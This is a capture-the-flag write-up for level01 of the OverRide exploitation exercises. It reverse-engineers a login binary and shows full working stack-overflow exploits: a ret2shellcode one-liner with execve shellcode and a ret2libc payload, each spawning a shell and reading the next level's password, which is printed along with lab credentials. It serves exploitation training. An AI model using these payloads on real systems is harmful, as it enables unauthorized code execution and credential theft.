# Stack buffer overflow and ret2shellcode/ret2libc

```shell
┌──$ [~/42/2022/override]
└─>  ssh -p4242 192.168.0.23 -l level01
     ____                  ____  _     __
    / __ \_   _____  _____/ __ \(_)___/ /__
   / / / / | / / _ \/ ___/ /_/ / / __  / _ \
  / /_/ /| |/ /  __/ /  / _, _/ / /_/ /  __/
  \____/ |___/\___/_/  /_/ |_/_/\__,_/\___/

                       Good luck & Have fun

   To start, ssh with level00/level00 on 192.168.0.23:4242
level01@192.168.0.23's password: uSq2ehEGT6c9S24zbshexZQBXUGrncxn5sD5QfGL

RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level01/level01
```
Three user functions and a global uninitialized variable of 100 bytes are declared.
```nasm
gdb-peda$ info functions
All defined functions:

[...]
0x08048464  verify_user_name
0x080484a3  verify_user_pass
0x080484d0  main
[...]
```
```shell
level01@OverRide:~$ objdump -t ./level01 | grep bss
[...]
0804a040 g     O .bss 00000064              a_user_name
```
Declaration and initialization of local array `user_pass` to value `0`.
```nasm
gdb-peda$ disass main
[...]
   0x080484d8 <+8>: sub    esp,0x60
   0x080484db <+11>:  lea    ebx,[esp+0x1c]
   0x080484df <+15>:  mov    eax,0x0
   0x080484e4 <+20>:  mov    edx,0x10
   0x080484e9 <+25>:  mov    edi,ebx
   0x080484eb <+27>:  mov    ecx,edx
   0x080484ed <+29>:  rep stos DWORD PTR es:[edi],eax
[...]
```
It gets a user name from `stdin`.
```nasm
gdb-peda$ disass main
[...]
   0x08048510 <+64>:  mov    eax,ds:0x804a020          # stdin
   0x08048515 <+69>:  mov    DWORD PTR [esp+0x8],eax
   0x08048519 <+73>:  mov    DWORD PTR [esp+0x4],0x100 # 256 bytes
   0x08048521 <+81>:  mov    DWORD PTR [esp],0x804a040 # a_user_name
   0x08048528 <+88>:  call   0x8048370 <fgets@plt>
[...]
```

It initialize `esi` register to point at `a_user_name` and the `edi` register to the string `dat_wil`. Then it repeats a comparaison of bytes as long as `[esi]` and `[edi]` are equal.
So input can begin with exact match and the rest part can be anything.
```nasm
gdb-peda$ disass verify_user_name
[...]
   0x08048478 <+20>:  mov    edx,0x804a040
   0x0804847d <+25>:  mov    eax,0x80486a8
   0x08048482 <+30>:  mov    ecx,0x7
   0x08048487 <+35>:  mov    esi,edx
   0x08048489 <+37>:  mov    edi,eax
   0x0804848b <+39>:  repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
[...]
gdb-peda$ x/s 0x804a040
0x804a040 <a_user_name>:  ""
gdb-peda$ x/s 0x80486a8
0x80486a8:  "dat_wil"
```
It gets a user password from `stdin` and calls `verify_user_pass` function.
```nasm
gdb-peda$ disass main
[...]
   0x0804855c <+140>: mov    eax,ds:0x804a020
   0x08048561 <+145>: mov    DWORD PTR [esp+0x8],eax
   0x08048565 <+149>: mov    DWORD PTR [esp+0x4],0x64
   0x0804856d <+157>: lea    eax,[esp+0x1c]
   0x08048571 <+161>: mov    DWORD PTR [esp],eax
   0x08048574 <+164>: call   0x8048370 <fgets@plt>
   0x08048579 <+169>: lea    eax,[esp+0x1c]
   0x0804857d <+173>: mov    DWORD PTR [esp],eax
   0x08048580 <+176>: call   0x80484a3 <verify_user_pass>
[...]
```
Inside `verify_user_pass` it compares bytes of `user_pass` and litteral string `admin`, then return the result.
```nasm
[...]
gdb-peda$ disass verify_user_pass
[...]
   0x080484a8 <+5>:  mov    eax,DWORD PTR [ebp+0x8]
   0x080484ab <+8>:  mov    edx,eax
   0x080484ad <+10>: mov    eax,0x80486b0
   0x080484b2 <+15>: mov    ecx,0x5
   0x080484b7 <+20>: mov    esi,edx
   0x080484b9 <+22>: mov    edi,eax
   0x080484bb <+24>: repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x080484bd <+26>: seta   dl
   0x080484c0 <+29>: setb   al
[...]
gdb-peda$ x/s 0x80486b0
0x80486b0:  "admin"
```
But use of retrieved credentials, username `dat_wil` and password `admin`, do not allow anything and the program returns 1 with error message `nope, incorrect password...`.
```nasm
   0x08048589 <+185>:   cmp    DWORD PTR [esp+0x5c],0x0
   0x0804858e <+190>:   je     0x8048597 <main+199>
   0x08048590 <+192>:   cmp    DWORD PTR [esp+0x5c],0x0
   0x08048595 <+197>:   je     0x80485aa <main+218>
```
```shell
level01@OverRide:~$ ./level01; echo $?
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
admin
nope, incorrect password...

1
```
`fgets()` reads in at most one less than 100 bytes from `stdin` and stores the input into the 64-bytes buffer `user_pass`. Which is 36 bytes more than allocated buffer. It means that `user_pass` variable can be overflowed and the value of `EIP` can be overwritten.
```nams
   0x0804855c <+140>:   mov    eax,ds:0x804a020          // eax = stdin
=> 0x08048561 <+145>:   mov    DWORD PTR [esp+0x8],eax   // stdin);
   0x08048565 <+149>:   mov    DWORD PTR [esp+0x4],0x64  // 100, stdin);
   0x0804856d <+157>:   lea    eax,[esp+0x1c]            // eax = user_pass
   0x08048571 <+161>:   mov    DWORD PTR [esp],eax       // user_pass, 100, stdin);
   0x08048574 <+164>:   call   0x8048370 <fgets@plt>     // fgets(user_pass, 100, stdin);
```

To find offset, generate a string of 100 bytes legth using [BOEIPOSG](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/).
```nasm
(gdb) start
Temporary breakpoint 1 at 0x80484d5
Starting program: /home/users/level01/level01

Temporary breakpoint 1, 0x080484d5 in main ()
(gdb) c
Continuing.
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
```
Program exit on `EIP` value 0x37634136 which gives offset of 80 bytes.

## ret2shellcode
As `a_user_name` is defined with 100 bytes, a shell code can be placed after `dat_wil` and EIP overwritten to `a_user_name+7`.
```shell
level01@OverRide:~$ (python -c "import struct; print('dat_wil\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + '\n' + 'A'*80 + struct.pack('I', 0x0804a047))"; echo 'cat /home/users/$(whoami)/.pass') | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```
## ret2libc
```gdb
gdb-peda$ break *main+164
Breakpoint 1 at 0x8048574
gdb-peda$ run
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
[----------------------------------registers-----------------------------------]
EAX: 0xffffd6bc --> 0x0
EBX: 0xffffd6bc --> 0x0
ECX: 0xffffffff
EDX: 0xf7fd08b8 --> 0x0
ESI: 0x0
EDI: 0xffffd6fc --> 0x0
EBP: 0xffffd708 --> 0x0
ESP: 0xffffd6a0 --> 0xffffd6bc --> 0x0
EIP: 0x8048574 (<main+164>:     call   0x8048370 <fgets@plt>)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
0x8048565 <main+149>:        mov    DWORD PTR [esp+0x4],0x64
0x804856d <main+157>:        lea    eax,[esp+0x1c]
0x8048571 <main+161>:        mov    DWORD PTR [esp],eax
=> 0x8048574 <main+164>:     call   0x8048370 <fgets@plt>
0x8048579 <main+169>:        lea    eax,[esp+0x1c]
0x804857d <main+173>:        mov    DWORD PTR [esp],eax
0x8048580 <main+176>:        call   0x80484a3 <verify_user_pass>
0x8048585 <main+181>:        mov    DWORD PTR [esp+0x5c],eax
Guessed arguments:
arg[0]: 0xffffd6bc --> 0x0
arg[1]: 0x64 ('d')
arg[2]: 0xf7fcfac0 --> 0xfbad2288
[------------------------------------stack-------------------------------------]
0000| 0xffffd6a0 --> 0xffffd6bc --> 0x0
0004| 0xffffd6a4 --> 0x64 ('d')
0008| 0xffffd6a8 --> 0xf7fcfac0 --> 0xfbad2288
0012| 0xffffd6ac --> 0x1
0016| 0xffffd6b0 --> 0xffffd8cb ("/home/users/level01/level01")
0020| 0xffffd6b4 --> 0x2f ('/')
0024| 0xffffd6b8 --> 0xffffd70c --> 0xf7e45513 (<__libc_start_main+243>:        mov    DWORD PTR [esp],eax)
0028| 0xffffd6bc --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x08048574 in main ()
gdb-peda$ info frame
Stack level 0, frame at 0xffffd710:
eip = 0x8048574 in main; saved eip 0xf7e45513
called by frame at 0xffffd780
Arglist at 0xffffd708, args:
Locals at 0xffffd708, Previous frame's sp is 0xffffd710
Saved registers:
ebx at 0xffffd700, ebp at 0xffffd708, edi at 0xffffd704, eip at 0xffffd70c
gdb-peda$ p/d 0xffffd70c-0xffffd6bc
$1 = 80
gdb-peda$ print system
$2 = {<text variable, no debug info>} 0xf7e6aed0 <system>
gdb-peda$ print exit
$3 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xf7f897ec ("/bin/sh")
```
```shell
level01@OverRide:~$ (python -c "import struct; print('dat_wil\n' + 'A'*80 + struct.pack('I', 0xf7e6aed0) + struct.pack('I', 0xf7e5eb70) + struct.pack('I', 0xf7f897ec))"; echo 'cat /home/users/$(whoami)/.pass') | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```
